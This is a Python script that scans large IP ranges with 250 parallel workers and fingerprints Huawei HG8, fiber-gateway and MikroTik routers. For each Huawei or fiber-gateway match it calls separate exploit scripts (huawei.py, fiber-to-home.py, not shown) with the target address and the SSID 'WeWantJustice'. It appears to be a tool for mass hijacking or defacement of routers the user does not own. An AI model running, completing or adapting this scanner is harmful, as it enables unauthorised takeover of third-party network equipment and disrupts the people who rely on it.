import os,sys,platform,requests
from multiprocessing import Pool
from sys import exit
from datetime import datetime
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

net = input("Enter the Network Address: ")
ssid="'WeWantJustice'"
net1= net.split('.')
a = '.'

net2 = net1[0] + a + net1[1] + a 
net4 = a + net1[2] + a + net1[3]  
st1 = 102  # 10.10.*  start
en1 = 120  # 10.10.*  end
# en1 = en1 + 1
st2 = 0 # 10.10.10.*  start
en2 = 255 # 10.10.10.* end
# en2 = en2 + 1
st3 = 0 # 10.10.10.*  start
en3 = 255 # 10.10.10.* end
# en3 = en2 + 1
st4 = 0 # 10.10.10.*  start
en4 = 255 # 10.10.10.* end
# en4 = en2 + 1
# oper = platform.system()
links = []
error = []

t1 = datetime.now()
print ("Scanning in Progress:")


def ping_scan(url):
  print('\r'+url+ '     ',end=' ',flush=True)
  # print(url)
  try:
    out = subprocess.check_output('ping -c 3 -w 3 %s' % url,stderr=subprocess.STDOUT, shell=True)
    res = 0    # no exception, exit status must be 0
  except subprocess.CalledProcessError as e:
    out = e.output
    res = e.returncode
  out= str(out)
  # # conn = str(conn)
  # # print(output.decode('utf-8'))
  # # # conn = sr1(icmp,timeout=1)
  if(out.find('ttl=254') != -1) :
    print ('\r'+url+ ' Live'+ '\t\t')
  # s.close()
def run_cmd(cmd):
  try:
      out = subprocess.check_output(cmd,stderr=subprocess.STDOUT, shell=True)
      res = 0    # no exception, exit status must be 0
  except subprocess.CalledProcessError as e:
    out = e.output
    res = e.returncode
  out = out.decode('utf8')
  return out

def find_router(url):
  print('\r'+"http://" +url+ '/     ',end=' ',flush=True)
  ra = requests.get("http://"+url+"/",verify=False,timeout=2)
  ra.raise_for_status()
  rs=ra.text
  if (rs.find("Gateway") != -1):
    out = run_cmd('python3 fiber-to-home.py '+url+' '+ssid)
    if ( out.find('0') != -1 ):
      print ("\rFTH Router : "+ url+" - "+ssid+"               ")
  elif (rs.find('RouterOS') != -1): 
    print ("\rmikrotik : "+ url+"                                   ")
  else:
    print ("\rOther Router : " + url+"     ")

def huawei_router(url):
  print('\r'+"https://" +url+ ':80/     ',end=' ',flush=True)
  try:
    r = requests.get("https://" + url+ ':80/',verify=False,timeout=2)
    r.raise_for_status()
    rs=r.text
    if (rs.find('HG8') != -1 or rs.find('telecomadmin') != -1):
      out = run_cmd('python3 huawei.py '+url+' '+ssid)
      if ( out.find('0') != -1 ):
        print ("\rHuawei Router : https://"+ url+":80/ - "+ssid+"      ")
  except:
    find_router(url)
def port_scan(url):
  # print(url)
   try:
    huawei_router(url)
   except requests.exceptions.HTTPError as errb:
      find_router(url)
   except requests.exceptions.ConnectionError as errc:
      error.append(url)
   except requests.exceptions.Timeout as  errt:
      error.append(url)
   except:
      error.append(url)

def bb(net3):
   for ip in range(st4,en4):
      addr = net3 + str(ip)
      # addr = str(ip) +'.'+ net3
      url = addr 
      links.append(url)
def aa():
   for ip in range(st3,en3):
      net3 = net2  + str(ip) + '.' 
#      net3 = net2  + str(ip) 
      bb(net3)
def dd(net3):
   for ip in range(st1,en1):
      addr = str(ip)+ '.' + net3
      #addr = str(ip) +'.'+ net3
      url = addr 
      links.append(url)
def cc():
   for ip in range(st2,en2):
      net3 = str(ip) + net4 
      dd(net3)
aa()
# cc()
def do():
    p = Pool(processes=250)
    try:
        p.map(port_scan, links)
        # p.map(ping_scan, links)
        p.close()
    except KeyboardInterrupt:
        print('got ^C while pool mapping, terminating the pool')
        p.terminate()
        print('\r[!] Good Bye J3rry')
        sys.exit()
    finally:
        p.join()
if __name__ == "__main__":
   try:
      do()
   except KeyboardInterrupt:
      sys.exit()
   t2 = datetime.now()
   total = t2 - t1
   print ("Scanning completed in: ",total)


#hi 100.66.0.1
